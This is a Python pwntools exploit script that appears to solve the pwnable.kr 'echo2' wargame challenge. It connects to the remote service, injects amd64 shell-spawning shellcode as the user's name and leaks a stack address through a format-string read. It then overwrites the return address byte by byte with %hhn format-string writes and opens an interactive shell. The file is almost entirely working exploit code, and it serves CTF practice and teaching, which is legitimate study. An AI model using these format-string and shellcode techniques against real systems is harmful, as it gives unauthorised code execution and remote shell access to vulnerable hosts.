#!/usr/bin/env python3

import pwn

#io = pwn.process('./echo2')
io = pwn.remote('pwnable.kr', 9011)
elf = pwn.ELF('./echo2')
io.recvuntil('hey, what\'s your name? : ')

shell = pwn.shellcraft.amd64.linux.sh()
name = pwn.asm(shell, arch = 'amd64', os = 'linux')
io.sendline(name)

def fsb_read(payload):

	io.recvuntil('> ')
	io.sendline(str(2))
	io.recvuntil(name)

	io.sendline(payload)
	io.recvline()
	return io.recvline()[:-1]

def fsb_write(payload):
	io.recvuntil('> ')
	io.sendline(str(2))
	io.recvuntil(name)

	io.sendline(payload)

def exit():
	io.recvuntil('> ')
	io.sendline(str(4))
	io.recvuntil('Are you sure you want to exit? (y/n)')
	io.sendline('y')
	io.recvuntil('bye')

data = fsb_read('%10$lx')
leak_addr = int(data, 16)
ret_addr = leak_addr + 8
shell_addr = leak_addr - 32

shell_addr_bytes = pwn.p64(shell_addr)

pwn.context.terminal = ['tmux', 'splitw', '-h']
if pwn.args['GDB']:
	pwn.gdb.attach(io, '''
		source ~/peda/peda.py
	''')

for i in range(8):
	#payload = '%{0}s%8$hhn'.format(0xff).ljust(16, ' ').encode()
	payload = '%{0}s%8$hhn'.format(shell_addr_bytes[i]).ljust(16, ' ').encode()
	fsb_write(payload + pwn.p64(ret_addr + i))

exit()
io.interactive()
